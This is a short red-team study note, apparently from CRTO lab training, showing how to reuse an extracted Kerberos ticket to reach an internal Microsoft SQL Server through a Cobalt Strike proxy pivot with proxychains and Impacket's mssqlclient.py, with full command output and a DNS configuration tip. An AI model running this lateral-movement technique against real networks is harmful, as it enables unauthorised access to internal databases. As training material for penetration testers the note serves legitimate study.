
Having an extracted Kerberos ticket (check [[Pivoting with Kerberos]] ) , you can connect to a DB in and internal Windows environment through a proxy pivot in Cobalt Strike:

```
ubuntu@DESKTOP-3BSK7NO ~> proxychains mssqlclient.py -dc-ip 10.10.122.10 -no-pass -k dev.cyberbotic.io/bfarmer@sql-2.dev.cyberbotic.io

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.25:1433-<><>-OK
[*] Encryption required, switching to TLS
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL-2): Line 1: Changed database context to 'master'.
[*] INFO(SQL-2): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands

SQL> select @@servername;

--------------------------------------------------------------------------------------------------------------------------------

SQL-2
```


⚠   This may require adding a static host entry to `/etc/hosts` and changing the _proxy_dns_ setting in `/etc/proxychains.conf` to _remote_dns_.




### Properties
---
📆 created   {{17-02-2024}} 18:36
🏷️ tags: #redteam #crto 

---

